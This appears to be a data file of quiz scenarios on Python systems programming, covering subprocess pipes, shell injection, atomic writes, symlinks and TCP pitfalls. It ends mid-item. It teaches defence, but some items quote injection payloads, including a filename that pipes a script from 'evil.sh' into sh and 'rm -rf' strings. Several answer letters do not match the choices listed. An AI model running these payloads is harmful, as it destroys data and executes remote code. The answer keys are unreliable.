scenarios.title: shell=True strikes
scenarios.situation: A helper runs `subprocess.run(f"grep {pattern} {path}", shell=True)` where pattern comes from a web form. A security review flags it.
scenarios.prompt: What is the risk, and what is the minimal safe fix?
evidence: pattern is taken verbatim from an HTTP query parameter.
choices: An attacker can inject shell metacharacters (e.g. `pattern='x; rm -rf ~'`) — shell=True runs the string through /bin/sh; pass an argument list with shell=False: subprocess.run(['grep', pattern, path], ...)
shell=True is only a performance issue; the fix is to add timeout=30
The risk is that grep is slow on large files; replace grep with Python's re module for speed
capture_output=True leaks the output to other users; remove it and write to a temp file instead
scenarios.why: With shell=True the command string is parsed by a shell, so `;`, `$()`, and backticks in user input execute arbitrary commands. An argv list with shell=False passes each element as a literal argument — no shell parsing, no injection.
scenarios.hint: What interprets the string when shell=True — and what does it do with a semicolon?

scenarios.title: asyncio: tasks vs coroutines
scenarios.situation: A script must fetch 200 URLs. The first version awaits each fetch in a loop (slow, sequential). The rewrite wraps each fetch in asyncio.create_task and awaits them with asyncio.gather — and it is 40x faster.
scenarios.prompt: Why did the rewrite get faster?
evidence:
for url in urls:
    results.append(await fetch(url))   # sequential

tasks = [asyncio.create_task(fetch(u)) for u in urls]
results = await asyncio.gather(*tasks)  # concurrent
choices: Version A parks the loop on each await in turn; version B schedules all 200 coroutines so their I/O waits overlap on the single event loop
create_task spawns 200 OS threads, bypassing the GIL
gather compiles the coroutines to C, removing interpreter overhead
Version B reuses one TCP connection, version A opens a new one per URL
scenarios.why: await in a loop serializes the waits; create_task schedules each coroutine on the event loop immediately, so all 200 network waits overlap — the loop is never idle while any fetch is in flight. No threads are involved (still one thread, one loop), which is why it only helps I/O-bound work.
scenarios.hint: While one fetch is waiting on the network, what is the event loop doing in each version?

scenarios.title: Packaging: what goes in pyproject.toml?
scenarios.situation: A team is packaging an internal CLI tool. They argue about where to declare the console entry point, the Python version floor, and third-party dependencies.
scenarios.prompt: Which pyproject.toml layout follows current Python packaging standards?
choices: Candidate A: PEP 621 [project] metadata with requires-python, dependencies, and a [project.scripts] console entry point — the modern standard buildable by any PEP 517 backend
Candidate B: setup.py-style keys under [tool.setup] keep compatibility with the widest range of installers
Neither — entry points must be declared in a separate entry_points.txt committed to the repo root
Candidate A but with dependencies listed in requirements.txt and referenced by path, which pip prefers
scenarios.why: PEP 621 standardized project metadata in pyproject.toml ([project] table, requires-python, dependencies, [project.scripts] for console scripts), built by PEP 517 backends like setuptools/hatchling. requirements.txt is for reproducible environments, not package metadata; open() calls have no place in static metadata.
scenarios.hint: Which candidate uses static, standards-based metadata that any modern build backend understands?

scenarios.title: cProfile says the hot spot is a surprise
scenarios.situation: A report generator takes 90 seconds. cProfile shows 70% of cumulative time in `re.compile` inside a helper called once per row, and the helper compiles the same three patterns every call.
choices: Compile the patterns once at module level (or cache them) so parse_row reuses the compiled objects instead of recompiling 48,000 times
Rewrite the parser in C — Python regex is fundamentally too slow for 48k rows
Add multiprocessing so the 48k compiles run across cores
Switch from re to the fnmatch module, which has no compile step
scenarios.why: re.compile is expensive and the patterns never change; hoisting the three compiles to module import time (or functools.lru_cache) removes ~63s of redundant work with a two-line change. Profile-guided fixes target the measured hot spot instead of rewriting the system.
scenarios.hint: The profiler measured 144,000 compiles of patterns that never change — where could they be compiled exactly once?

scenarios.title: Deadlock in an asyncio pipeline
scenarios.situation: A producer coroutine puts items into an asyncio.Queue(maxsize=10) and a consumer gets them, but with no consumer running yet the producer hangs forever after 10 items. The team wants backpressure without deadlock.
scenarios.prompt: What is the correct analysis and fix?
evidence: Producer stalls after 10 puts; nothing consumes because the consumer starts after produce() returns.
choices: await q.put() on a full bounded queue blocks until a consumer takes an item — with no consumer running this deadlocks; start the consumer concurrently (create_task) so puts and gets interleave, keeping the maxsize backpressure
Remove maxsize so the queue is unbounded — memory growth is preferable to deadlock
Replace await q.put with q.put_nowait and drop items when the queue is full
Queues cannot be shared between coroutines; use a global list with a lock instead
scenarios.why: A bounded queue's put() applying backpressure is correct behavior — the bug is sequencing: the producer was awaited to completion before the consumer started. Running both as tasks lets the consumer drain the queue as the producer fills it; the maxsize bound still protects memory.
scenarios.hint: The queue is doing its job (blocking when full) — so what is missing from the schedule?

scenarios.title: Signals and subprocess cleanup
scenarios.situation: A long-running orchestrator spawns worker processes with subprocess.Popen. When the orchestrator gets SIGTERM, the workers keep running as orphans and hold ports open.
scenarios.prompt: Which approach cleans up the workers reliably on termination?
evidence:
procs = [subprocess.Popen(["worker", ...]) for _ in range(4)]
# no signal handling; parent just exits on SIGTERM
choices: Install a SIGTERM/SIGINT handler that terminates the children (proc.terminate(), then wait with a timeout, then kill stragglers) — optionally start children in their own process group (start_new_session=True) and signal the group
Rely on the OS: when a parent dies, the kernel automatically SIGKILLs its children
Set daemon=True on the Popen objects so they die with the parent
Have each worker poll for its parent's PID and exit when the parent disappears
scenarios.why: Orphaned children are reparented to init, not killed — cleanup is the parent's job. A signal handler that terminate()s each child, waits, then kill()s survivors is the reliable pattern; a separate process group lets one signal reach the whole tree including grandchildren.
scenarios.hint: When the parent dies, what actually happens to its children — who is responsible for them?

scenarios.title: The Python for Systems Programming Mystery
scenarios.situation: Users report that Python for Systems Programming is not working correctly. The obvious checks pass — the components are online, basic connectivity works. You need to think in systems, not symptoms.
scenarios.prompt: Using the systems anatomy method (whole → cut open → step through → pull apart), how would you systematically trace a failure in Python for Systems Programming?
choices: Walk the full journey: start from the trigger, verify each handoff in sequence, check dependencies at every step, and isolate where the flow breaks — then examine that specific layer
Restart all components — Python for Systems Programming issues are always fixed by restarting
Check the most common cause from memory and apply that fix immediately
Escalate to senior support — Python for Systems Programming is too complex to troubleshoot systematically
scenarios.why: The correct answer is A. Systems thinking means tracing the living flow: (1) Whole: what is Python for Systems Programming supposed to do end-to-end? (2) Cut open: what are the layers/stages? (3) Step through: verify each handoff — where does the expected output diverge from actual? (4) Pull apart: isolate the broken layer and examine it in detail. This method works for any Python for Systems Programming failure in Python Systems.
scenarios.hint: Don't jump to the fix. First map the journey, then find where it breaks.
objectives: Apply systems anatomy to Python for Systems Programming
evidence: All Python for Systems Programming components report 'online'. Basic health checks pass.
Functionality is broken despite green status indicators. The failure is in the flow, not the components.

scenarios.title: The Shell Injection
scenarios.situation: A script builds a shell command with f-strings: os.system(f"grep {user_input} log.txt"). It works in testing. In production, a user inputs "; rm -rf /tmp/data".
scenarios.prompt: What is the fix, and the principle?
choices: Never pass untrusted input through a shell: use subprocess.run with an argument list and shell=False, so the input is data to grep, not code for sh. The principle: the shell is a programming language — interpolating user input into it is code injection, same class as SQL injection.
Sanitize the input with a regex and keep os.system.
Ban grep; write your own search.
scenarios.why: The correct answer is A. shell=True (or os.system) hands your string to /bin/sh for parsing — metacharacters (;, |, $()) become code. The argument-list form bypasses the shell entirely: execve gets argv directly, and no parsing means no injection. Sanitization regexes are bypassable; the structural fix (no shell) is not. This is the single most important subprocess lesson.
scenarios.hint: Is the user input data or code when the shell parses it?
evidence: subprocess.run([...], shell=False). The shell parses; argv doesn't.

scenarios.title: The Threads That Didn't Help
scenarios.situation: A CPU-bound image-processing loop is parallelized with 8 threads. It runs no faster — slightly slower, in fact.
choices: The GIL (Global Interpreter Lock): CPython executes Python bytecode on one thread at a time. Threads help I/O-bound work (they yield during waits) but not CPU-bound work — 8 threads contend for one lock. The fix: multiprocessing (separate interpreters, real parallelism) or native extensions that release the GIL.
scenarios.why: The correct answer is B. The GIL serializes bytecode execution: threads overlap I/O waits beautifully (network, disk) but cannot parallelize computation. The slowdown comes from lock contention and context switching. The decision tree: I/O-bound → threads/asyncio; CPU-bound → multiprocessing (or NumPy/C extensions). Knowing which you have is the entire concurrency decision.
scenarios.hint: Was the workload waiting or computing?
evidence: Threads for I/O-bound, processes for CPU-bound. Know which you have.

scenarios.title: The Hanging Pipeline
scenarios.situation: A script pipes a large command's stdout: p = Popen(cmd, stdout=PIPE); p.wait(); out = p.stdout.read(). It hangs on large outputs.
choices: PIPE is broken for large output.

Pipe-buffer deadlock: the child's stdout pipe fills (64KB), the child blocks writing, and the parent blocks in wait() — each waiting for the other forever. Fix: communicate() (drains while waiting) or read incrementally. Never wait() before draining a PIPE you will read.
The command is slow; wait longer.
scenarios.why: The correct answer is C. OS pipes have finite buffers: when full, the writer blocks until someone reads. wait() without draining creates the classic deadlock — parent waits for child exit, child waits for parent to read. communicate() exists precisely for this: it pumps both streams while waiting. The rule is absolute: if stdout=PIPE, either communicate() or stream the reads — never bare wait().
scenarios.hint: Who reads the pipe while the parent waits?
evidence: PIPE + wait() = deadlock on large output. Use communicate().

scenarios.title: Planning Your Month
scenarios.situation: You have four weeks. Option 1: read Python docs cover to cover. Option 2: run every lesson example, do every lab, keep a bug ledger, take the mock twice.
scenarios.prompt: Which produces an engineer who can pass a systems interview?
choices: Option 2. Interviews probe run knowledge — 'what happens when the pipe fills?' — which comes only from running and breaking code. Doc-reading builds vocabulary; labs build the failure-mode models interviews test. The mock converts practice into performance under pressure.
scenarios.why: The correct answer is D. Systems interviews are adversarial retrieval: they ask about deadlocks, the GIL, signal handling — phenomena you only understand by triggering them. Reading about pipe deadlock without causing one leaves no mental model. The ledger-plus-lab loop builds models; the mock builds pressure tolerance.
scenarios.hint: Which plan contains failures you have personally caused?
evidence: Interview answers come from caused-and-fixed failures.

domains.name: Capstone: Ship a Systems Tool
domains.summary: A guided end-to-end project: build a production-grade log shipper / process supervisor — CLI, config, logging, concurrency, tests, packaging — in three phases.

scenarios.title: The Invariant First
scenarios.situation: You are tempted to start coding the shipper immediately. Your mentor says: write the invariants first.
choices: Invariants are only for distributed systems.

Invariants are the design: 'every byte shipped exactly once across restarts' determines offset tracking, rotation handling, and shutdown behavior. Code without invariants optimizes for the demo; invariants force the hard cases (kill -9, rotation race) into the design before they become bugs.
Documentation is more important than code.
scenarios.why: The correct answer is B. The invariant list is the specification against which every design decision is tested: it tells you that offsets must persist, that shutdown must drain, that rotation needs inode tracking. Without it, you build the happy path and discover the edge cases in production. 'Write the invariant' is the systems version of 'write the test first.'
scenarios.hint: What decides whether you need offset tracking: the code or the invariant?
evidence: State the guarantee; the design follows. Test against it.

scenarios.title: The Flood
scenarios.situation: The destination slows down; your shipper's queue grows unboundedly; the OOM killer takes it at 3 AM, losing the in-memory queue.
scenarios.prompt: What was the design error, and the fix?
choices: Queues are a mistake; use direct writes.

No backpressure policy: an unbounded queue turns downstream slowness into OOM. The fix is an explicit policy — bounded queue with block (slow the tailer, apply backpressure upstream) or drop-oldest with metrics (shed load, count it). Either is defensible; unbounded is not a policy, it is the absence of one.
scenarios.why: The correct answer is C. Backpressure must be designed: block (propagate slowness upstream — safe but can stall the tailer), drop with counting (shed load, stay alive, alert on the drop rate), or spill to disk (durable but complex). The OOM chose 'crash and lose everything' — the worst policy, selected by default. Every queue in the system needs a named policy for 'what when full.'
scenarios.hint: What policy did the unbounded queue implement?
evidence: Every queue needs a full-policy: block, drop+count, or spill. Unbounded = OOM.

scenarios.title: The Rotation Race
scenarios.situation: Log rotation (log.txt → log.txt.1, new log.txt) happens while your tailer reads. Lines are lost: the tailer kept reading the old inode / missed the new file.
choices: Track by inode, not name: watch the directory for new files, detect rotation (name now points to a new inode), finish draining the old inode, then switch. tail -F semantics: follow the name across rotation, the descriptor across truncation. Test with rapid rotate-write cycles.
scenarios.why: The correct answer is D. Rotation is an identity problem: the NAME moves to a new file while the old file (inode) still has unread data. Correct handling: hold the old fd open and drain it, watch for the name → new inode, then follow the new one. This is why tail -F exists separately from tail -f. The race is fundamental — only inode-aware logic closes it, and only a rotation test proves it.
scenarios.hint: What does the filename identify after rotation: the old data or the new file?
evidence: Follow names across rotation, descriptors across truncation. Test the race.

scenarios.title: The Unscriptable Tool
scenarios.situation: Your shipper works, but every operation needs manual config-file editing and there is no --help. Teammates cannot adopt it.
choices: The CLI as a product interface: subcommands (ship, validate, status), complete --help, config validation with clear errors, and env-var overrides. A tool without a CLI is a script with ambition — adoption requires scriptability, and scriptability requires an interface designed for machines and humans.
scenarios.why: The correct answer is A. The CLI is the tool's UI: validate catches config errors before 3 AM, status exposes health for monitoring, --help is the documentation of first resort. 'Read the code' does not scale; a designed interface does. The capstone's phase 2 exists because phase-1 engines without interfaces die as personal scripts.
scenarios.hint: Can a teammate operate your tool without reading its source?
evidence: Subcommands, --help, validate, status. Scriptable or it doesn't ship.

scenarios.title: The Unproven Guarantee
scenarios.situation: You claim 'zero data loss on restart.' You have never killed the shipper mid-load. An interviewer asks: 'Prove it.'
choices: Zero loss is impossible; retract the claim.

The chaos test: a repeatable script that streams load, kill -9s at random points, restarts, and asserts shipped == written (20+ iterations). 'I ran the kill loop 50 times with zero loss' is the proof; the claim without the test is a wish. Build the test before the interview.
scenarios.why: The correct answer is B. Reliability claims are empirical: the kill -9 loop exercises the exact failure mode (unclean shutdown under load) that the guarantee covers. Code review finds logic errors; only fault injection finds the race between the offset flush and the kill. The interviewer is testing whether your guarantees are tested — the strongest possible answer is the test log.
scenarios.hint: What evidence would convince YOU of someone else's zero-loss claim?
evidence: kill -9 loops prove restart guarantees. Claims without tests are wishes.

domains.name: Subprocess Automation
domains.summary: Running and supervising external processes: the subprocess module done right, pipes, timeouts, and process supervision.

scenarios.title: The Filename Attack
scenarios.situation: A script does subprocess.run(f"convert {fname} out.png", shell=True). An uploaded file is named "; curl evil.sh | sh; #.png".
scenarios.prompt: What happens, and what is the fix?
choices: Rename uploads to random strings (defense in depth, but not the fix).

The shell parses the filename as code: the ';' ends the convert command and runs the attacker's pipeline. Fix: run(['convert', fname, 'out.png']) with shell=False — the filename becomes argv data, never parsed. Filenames are attacker-controlled input; treat them as such.
Validate the filename extension and keep shell=True.
scenarios.why: The correct answer is C. This is shell injection via filename — the shell cannot distinguish data from code in a string. The argv form removes the parsing step entirely: execve receives the filename as a single argument, metacharacters inert. Renaming uploads is good hygiene but the structural fix is no-shell. Extension validation is bypassable (the payload hides after a valid-looking prefix).
scenarios.hint: When the shell parses the command string, is the filename data or code?
evidence: Filenames are attacker input. shell=False makes them data.

scenarios.title: The Backup That Hung
scenarios.situation: A backup script: p = Popen(['pg_dump', db], stdout=PIPE); p.wait(); data = p.stdout.read(). It hangs every night on the large database.
scenarios.prompt: Why does it hang on large DBs only, and what is the fix?
choices: pg_dump is slow on large DBs; increase the timeout.
The database is too large to back up.
PIPE buffers scale with data; just wait longer.

Pipe-buffer deadlock, size-dependent: small dumps fit in the 64KB pipe buffer (writer never blocks), large dumps fill it — pg_dump blocks writing while the parent blocks in wait(). Fix: out = p.communicate()[0], or stream p.stdout. The size dependence is the diagnostic signature of buffer deadlock.
scenarios.why: The correct answer is D. The size-dependent hang is the tell: below buffer capacity everything works, above it deadlocks. This is why the bug survives testing (small fixtures) and strikes in production (real data). communicate() drains concurrently with waiting; streaming consumes incrementally. Both respect the physics: the pipe must be read while the writer writes.
scenarios.hint: Why did it work in testing but hang in production?
evidence: Buffer deadlock strikes above 64KB. communicate() or stream.

scenarios.title: The Zombie Rsync
scenarios.situation: Using Popen directly, a sync command hangs; the script catches the timeout but the rsync process keeps running, holding locks.
choices: Kill and reap on timeout: p.kill() (escalate to p.kill after SIGTERM grace), then p.communicate() to reap — otherwise the orphan keeps running (locks held, ports bound) or becomes a zombie. subprocess.run handles this; raw Popen makes it your job. Timeouts without cleanup are half-handled.
scenarios.why: The correct answer is A. A timeout only interrupts YOUR wait — the child process is unaffected unless you act. The full pattern: terminate (SIGTERM, grace period), kill (SIGKILL if needed), reap (communicate/wait to collect the zombie). Skipping cleanup leaves lock-holding orphans — the 'mystery lock' incidents. This is why run(timeout=) is preferred: it kills on expiry automatically.
scenarios.hint: Does the timeout stop the child process?
evidence: Timeout interrupts your wait, not the child. Kill, then reap.

scenarios.title: The Hot Loop
scenarios.situation: A supervisor restarts a crashing worker instantly, forever. The worker crashes on a poison message; the loop burns CPU and fills disks with logs.
scenarios.prompt: What are the three missing controls?
choices: The worker code is fine; hardware issue.

Backoff (don't restart instantly — exponential with jitter), a crash cap (N restarts then page a human — the poison message needs a person, not a loop), and the poison-message handling (dead-letter the bad input so the NEXT worker doesn't crash on it too). Instant infinite restart is a self-inflicted DoS.
Faster restarts to clear the backlog.
scenarios.why: The correct answer is B. Crash loops need all three: backoff prevents resource burn, the cap prevents infinite futility (some failures need humans), and dead-lettering prevents the same input from killing every subsequent worker. The poison message is the key insight — restarting doesn't fix bad input; quarantining it does. Supervision policy is a design, not a while-True.
scenarios.hint: Will the 1000th restart succeed where the 999th failed?
evidence: Backoff + jitter, crash cap, dead-letter poison inputs.

scenarios.title: The Silent Failure
scenarios.situation: A deploy script runs migrations without check=True. The migration fails; the script continues and deploys the new code against the old schema. Outage.
scenarios.prompt: What is the one-flag fix, and the deeper lesson?
choices: check=True: fail fast on nonzero exit instead of continuing with garbage state. The deeper lesson: every external command's failure must be handled or propagated — silent continuation converts a caught error into a mystery outage. Fail fast, fail loudly, fail at the step that failed.
scenarios.why: The correct answer is C (index 2). Without check=True, the return code is ignored — the script cannot distinguish success from failure. The outage's shape (new code, old schema) is the signature of unchecked failure: the error was known to the OS and hidden from the operator. check=True converts it to an exception at the right place. The rule generalizes: never ignore a status you could check.
scenarios.hint: Where should the failure have stopped the script?
evidence: check=True. Unhandled nonzero exits become mystery outages.

scenarios.title: The Environment Leak
scenarios.situation: A script passes os.environ directly to a subprocess, which logs its environment on crash — including PROD_DB_PASSWORD. The logs ship to a shared aggregator.
choices: Env vars are fine; the logger is at fault.

Minimal explicit env: pass only what the child needs (env={**base, 'NEEDED': 'x'}), never the full parent environment. Secrets should arrive via files or secret managers, not env vars that get logged, dumped, or inherited. The child's environment is an attack surface — minimize it.
scenarios.why: The correct answer is D. Inheriting the full environment is convenient and dangerous: every secret the parent holds becomes visible to the child (and its logs, its /proc, its crash dumps). The principle of least privilege applies to environments too — construct the child's env explicitly. Better still: secrets via files with tight permissions or a secret manager, never env vars that propagate invisibly.
scenarios.hint: What else received the password besides the subprocess?
evidence: Construct the child's environment explicitly. Secrets via files/managers.

scenarios.title: When Shell Is Justified
scenarios.situation: A script needs glob expansion and a pipeline: process *.log | sort | uniq -c. The developer reaches for shell=True.
scenarios.prompt: Is it justified, and what are the safer alternatives?
choices: Sometimes justified for genuinely static commands — but safer: do the glob in Python (glob module), the pipeline with chained Popen, the sort/uniq with Python (collections.Counter). shell=True is acceptable only when the command is fully static (no variables) — and even then, the Python version is debuggable and portable.
shell=True is always fine for internal tools.
Never use the shell, even for static commands.
scenarios.why: The correct answer is A. The test is: does any part of the command derive from variables? If yes, no shell — the injection risk dominates. If fully static, shell=True is tolerable but still inferior: Python's glob/Counter version is testable, portable (Windows!), and debuggable. The pipeline you 'need the shell for' is usually three Python lines. Reach for the shell last, not first.
scenarios.hint: Does any part of the command come from a variable?
evidence: Static-only, no variables. Python's glob/Counter usually wins.

domains.name: Filesystem Operations
domains.summary: Paths, traversal, permissions, atomic writes, file watching, and safe deletion.

scenarios.title: The Escape
scenarios.situation: A cleanup script deletes files under /srv/data following symlinks. An attacker plants a symlink /srv/data/x → /etc. The script follows it.
scenarios.prompt: What is the vulnerability class, and the fix?
choices: The attacker shouldn't have write access.

Symlink escape: following untrusted symlinks breaks the containment boundary — the script operates outside its sandbox. Fix: don't follow symlinks in destructive traversal (followlinks=False, lstat not stat), or resolve-and-verify each path stays within the root before acting. Destructive ops must never trust the tree's shape.
scenarios.why: The correct answer is D. Symlink attacks (and the classic tar/zip slip) exploit the gap between the path you checked and the file you opened — TOCTOU on the filesystem. The fix is structural: never follow symlinks during destructive operations, or verify containment after resolution. 'The attacker shouldn't have write access' is true but insufficient — defense in depth assumes the write happened.
scenarios.hint: Did the script delete what it checked, or what the symlink pointed to?
evidence: Destructive traversal never follows untrusted symlinks.

scenarios.title: The Half-Write
scenarios.situation: A service writes its state JSON directly to state.json. It is killed mid-write. On restart, json.load fails: the file is truncated. The service cannot start.
scenarios.prompt: What is the fix, and why does it work?
choices: Atomic write via tmp+rename: write to state.json.tmp, fsync, os.replace over state.json. A crash leaves either the old complete file or the new complete file — never a truncation. The rename is the atomic commit; the tmp file is the staging area.
Catch the JSON error and use defaults.
scenarios.why: The correct answer is A. Direct writes have a crash window: any kill between open and close leaves a partial file. tmp+replace shrinks the window to the atomic rename — the filesystem guarantees the rename is all-or-nothing. Catching the JSON error treats the symptom; atomicity removes the disease. This is the single most valuable filesystem pattern.
scenarios.hint: What does a reader see during the rename: old, new, or partial?
evidence: Rename is atomic. Crash leaves old or new, never partial.

scenarios.title: The Readable Key
scenarios.situation: A deploy creates /etc/app/key.pem with default 0o644. It works. Six months later, a compromised low-privilege account reads the key.
scenarios.prompt: What should the app have done?
choices: Check-and-refuse on startup: stat the key file, and if group/world-readable, exit with an error instead of running. Fail safe beats fail convenient — the deploy bug becomes a loud startup failure, not a silent six-month exposure. Plus: set 0o600 at creation, umask discipline.
Encrypt the key with another key.
scenarios.why: The correct answer is B. The app is the last line of defense for its own secrets: verifying permissions at startup converts a deployment misconfiguration into an immediate, loud failure. 0o644 'works' — which is exactly why it's dangerous. The check is five lines; the exposure was six months. Defense in depth means the app distrusts its own deployment.
scenarios.hint: Should the app run with a world-readable key, or refuse?
evidence: Refuse to run with exposed secrets. Loud failure beats silent leak.

scenarios.title: The Infinite Walk
scenarios.situation: A disk-usage tool with followlinks=True hangs on a directory tree containing a symlink loop (a/b → a). CPU spins forever.
choices: Don't follow symlinks (followlinks=False) for untrusted trees, and/or track visited (dev, inode) pairs to detect cycles. The loop is a graph cycle — visited-set detection is the general fix; not-following is the policy fix. Both beat 'hope the tree is clean.'
scenarios.why: The correct answer is C. Symlink loops turn trees into graphs; naive recursion never terminates. The visited-inode set detects any cycle (the robust fix), while followlinks=False avoids the hazard class entirely for cases where symlink targets don't need traversal. Untrusted trees are adversarial input — traverse them defensively.
scenarios.hint: Is the filesystem a tree or a graph when symlinks exist?
evidence: Track visited inodes; don't follow untrusted links.

scenarios.title: The Lost Rename
scenarios.situation: After a power loss, the new state file is missing — but the tmp file exists. The code did tmp+replace but no fsync.
choices: The rename itself: without fsync, the directory entry change lived only in the page cache — power loss took it. The file data was written (tmp exists), but the name → new-inode mapping wasn't durable. Fix: fsync the file before rename AND fsync the directory after. Durability has layers; each needs its flush.
Power loss is unfixable; accept it.
scenarios.why: The correct answer is D (index 3). This is the forgotten fsync: everyone fsyncs the file (data durability) but the rename is a directory modification — it needs the directory fd fsynced. The symptom (tmp exists, new name missing) is the signature: data made it, metadata didn't. Databases fsync directories; your state file should too. Each durability layer needs its own flush.
scenarios.hint: What is a rename, at the filesystem level?
evidence: Rename = directory change. Fsync the dir fd too.

scenarios.title: The Half-Written File
scenarios.situation: A watcher processes files on MODIFY events. An editor's atomic save (write tmp, rename) triggers CREATE+DELETE, and rapid writes trigger MODIFY on half-written files. The processor chokes on partial content.
choices: Debounce on quiescence: record event timestamps, act only after the path is quiet for N ms — and handle CREATE/DELETE/MOVED as well as MODIFY, since atomic saves don't look like modifies. Process settled files, not raw events. Test with real editors, not just echo.
Process every event immediately for lowest latency.
scenarios.why: The correct answer is A. Filesystem events describe the editor's save dance, not your processing unit: the tmp+rename pattern, rapid successive writes, and truncate+write all produce event bursts for one logical change. Debouncing (act on quiescence) plus handling all event types absorbs these. 'Lowest latency' processing of half-written files is not low latency — it's wrong answers fast.
scenarios.hint: Does one logical save produce one event?
evidence: Act on quiescence; handle CREATE/DELETE/MOVED, not just MODIFY.

scenarios.title: The Full Disk
scenarios.situation: A service crashes with 'No space left on device' during a write. The write was not atomic; the state file is now corrupt AND the disk is full.
choices: Handle ENOSPC as a first-class failure (catch, alert, degrade — don't crash mid-write), and always write atomically (tmp+replace) so a failed write leaves the old state intact. The corruption came from the non-atomic write; the crash came from the unhandled error. Disk-full is a normal condition — inodes fill, logs grow — not an act of God.
scenarios.why: The correct answer is B. Full disks are routine (log growth, runaway temp files), so ENOSPC needs a handler like any expected error: the atomic write guarantees the old state survives, and the handler degrades gracefully (stop accepting work, alert, shed). The incident combined two missing defenses — each would have halved the damage. Monitor disk/inode usage; alert at 80%, not 100%.
scenarios.hint: Is 'disk full' exceptional or routine?
evidence: Atomic writes + ENOSPC handling. Alert at 80%.

domains.name: Network Programming
domains.summary: Sockets, TCP/UDP, HTTP clients and servers, TLS, and the failure modes of distributed I/O.

scenarios.title: The Sticky Messages
scenarios.situation: A TCP client sends two JSON messages; the server sometimes receives them glued together, sometimes split. Parsing breaks intermittently.
scenarios.prompt: What is the bug, and the fix?
choices: TCP is a byte stream, not a message stream: send() boundaries are not preserved. Fix with framing — length-prefix (4-byte header), delimiter (newline), or fixed-size messages — and loop recv until the frame is complete. 'Sometimes works' is the signature of boundary assumptions.
The network is corrupting data; use UDP.
scenarios.why: The correct answer is A. The intermittency is the diagnostic: small messages often arrive in one segment (works), large or busy ones split or coalesce (breaks). Framing makes message boundaries explicit — the receiver reads the length, then loops until that many bytes arrive. Every application protocol (HTTP's Content-Length, for example) solves this; raw TCP never does it for you.
scenarios.hint: Does TCP preserve your send() boundaries?
evidence: TCP has no message boundaries. Length-prefix or delimit.

scenarios.title: The Hung Deploy
scenarios.situation: A deploy script calls an API with no timeout. The API hangs (network partition). The deploy hangs forever, blocking the pipeline.
choices: Timeouts at every layer: connect (5s), read (30s), and an overall deadline for the script. Plus: the pipeline step itself needs a timeout (CI-level). A hang with no timeout is unbounded — every network call is a promise the network may not keep.
scenarios.why: The correct answer is B. Each timeout bounds a different failure: connect (unreachable host), read (hung server), deadline (cascading slowness). And the CI step timeout is the backstop — the script's own bugs shouldn't hang the pipeline forever. 'The API shouldn't hang' is true and irrelevant; defensive clients assume the network lies.
scenarios.hint: Which hangs are bounded right now: none, some, or all?
evidence: Connect, read, deadline — plus the CI step's own timeout.

scenarios.title: The Double Charge
scenarios.situation: A payment POST times out. The client retries. The first request had actually succeeded — the customer is charged twice.
choices: Longer timeouts so it never times out.
Refund the double charge when noticed.

Idempotency keys: the client sends a unique key per logical operation; the server dedupes (same key = same result, no double effect). Retry is then safe. Retrying non-idempotent operations without keys is the bug — the timeout left the outcome unknown, and the retry guessed wrong.
scenarios.why: The correct answer is C. Timeout means 'unknown outcome' — not failure. Without idempotency, retry is a gamble: the first request may have succeeded. Idempotency keys convert the gamble into safety: the server recognizes the retry as the same operation. 'Never retry' sacrifices availability; keys give you both safety and retries.
scenarios.hint: After a timeout, did the request succeed or fail?
evidence: Timeout = unknown. Keys make retries safe.

scenarios.title: The Silent Death
scenarios.situation: A long-lived TCP connection goes silent: the peer died without FIN (power loss). The client waits forever for data that will never come.
choices: Keepalives or heartbeats: TCP SO_KEEPALIVE (slow, hours by default — tune it) or application-level pings (faster, portable). Without them, a silent peer is indistinguishable from an idle one. Design for silent death: every long-lived connection needs a liveness check.
scenarios.why: The correct answer is D. TCP's reliability covers data in flight, not peer liveness: a dead peer sends nothing, so there's nothing to detect without probing. Keepalives (kernel) or heartbeats (application) create the signal. The default keepalive interval (2 hours) is useless for most apps — tune it or use app pings every 30s. 'Wait longer' waits forever.
scenarios.hint: How do you distinguish a dead peer from a quiet one?
evidence: Keepalives/heartbeats on long-lived connections. Tune the interval.

scenarios.title: The Port Exhaustion
scenarios.situation: A service creates a new httpx.Client per request. Under load, it hits 'too many open files' / ephemeral port exhaustion.
scenarios.prompt: Why, and what is the fix?
choices: Each client opens fresh TCP+TLS connections that linger in TIME_WAIT after close; per-request clients multiply this by request rate. Fix: one shared session with connection pooling (keepalive reuses connections). The pool turns O(requests) handshakes into O(1).
scenarios.why: The correct answer is A (index 0). TIME_WAIT is TCP's correct behavior (2MSL wait); the bug is generating connections at a rate that exhausts the port space. Pooling reuses connections — fewer handshakes, fewer TIME_WAITs, lower latency as a bonus. Raising fd limits treats the symptom; the disease is connection churn.
scenarios.hint: How many TLS handshakes per request: one, or zero (reused)?
evidence: One pooled client. Per-request clients exhaust ports.

scenarios.title: The Unverified Context
scenarios.situation: Code uses ssl._create_unverified_context() 'to fix a cert error in dev.' It ships to production.
scenarios.prompt: Why is this catastrophic, and what was the right fix?
choices: The cert error was the real problem.

Unverified TLS is encryption without authentication: any network attacker (coffee-shop WiFi, compromised router) intercepts and reads everything — worse than no TLS, because it looks secure. The right fix was installing the CA cert (private CA) or fixing the hostname — never disabling verification. The 'temporary' dev hack became the permanent vulnerability.
scenarios.why: The correct answer is B. Verification is what makes TLS more than obfuscation: without it, the attacker presents any certificate and reads everything. The dev cert error had a correct fix (trust the private CA); disabling verification 'fixed' the error by removing the security. Grep your codebase for _create_unverified_context and CERT_NONE — each hit is a finding.
scenarios.hint: What does TLS without verification protect against?
evidence: Unverified TLS = plaintext with extra steps. Fix the CA, not the check.

scenarios.title: TCP or UDP?
scenarios.situation: A team debates the transport for: (a) file uploads, (b) live game positions, (c) DNS-like lookups.
scenarios.prompt: What is the correct mapping, and why?
choices: UDP for everything; speed always wins.
It doesn't matter; the OS handles it.

(a) TCP — correctness: every byte must arrive, in order. (b) UDP — timeliness: a late position update is worthless; drop it and use the newer one. (c) UDP usually — single round-trip, tiny messages; fall back to TCP for large responses. The trade is reliability vs latency — match it to the data's value over time.
TCP for everything; reliability always wins.
scenarios.why: The correct answer is C. The choice follows the data's temporal value: file bytes are timeless (TCP's retransmission is pure win); game positions decay in milliseconds (TCP's head-of-line blocking delivers stale news late — worse than loss); DNS is request/response tiny (UDP's single round trip, with TCP fallback). 'Reliability always wins' ignores that late data can be worse than lost data.
scenarios.hint: Is a late game position better than a lost one?
evidence: Timeless data: TCP. Decaying data: UDP.

domains.name: Concurrency Systems
domains.summary: Threads, processes, asyncio, queues, and the honest limits of each — plus the bugs they breed.

scenarios.title: The Lost Update
scenarios.situation: Two threads increment a shared counter 100k times each. The final count is 143,207 instead of 200,000.
